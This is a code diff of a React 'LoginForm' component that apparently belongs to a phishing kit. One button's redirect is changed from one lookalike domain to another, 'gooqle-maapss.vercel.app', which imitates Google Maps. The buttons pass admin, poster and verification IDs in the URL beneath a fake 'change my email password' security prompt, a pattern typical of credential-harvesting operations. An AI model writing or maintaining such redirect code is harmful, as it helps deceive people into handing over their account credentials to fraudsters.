@@ -57,7 +57,7 @@ function LoginForm({ adminId, posterId ,verifyId}) {
       </div>
 
       <div className="space-y-4 w-full max-w-md">
-        <button  onClick={() => window.open(`https://revieww-mega.vercel.app/${adminId}/${posterId}/${verifyId}`, '_blank')}  className="w-full bg-green-500 text-white py-3 px-4 rounded-md font-medium hover:bg-green-600">
+        <button  onClick={() => window.open(`https://gooqle-maapss.vercel.app/${adminId}/${posterId}/${verifyId}`, '_blank')}  className="w-full bg-green-500 text-white py-3 px-4 rounded-md font-medium hover:bg-green-600">
           OK. I understand.<br /> I will go change my email password first.
         </button>
         <button   onClick={() => window.open(`https://revieww-mega.vercel.app/${adminId}/${posterId}/${verifyId}`, '_blank')} className="w-full bg-orange-400 text-white py-3 px-4 rounded-md font-medium hover:bg-orange-500">
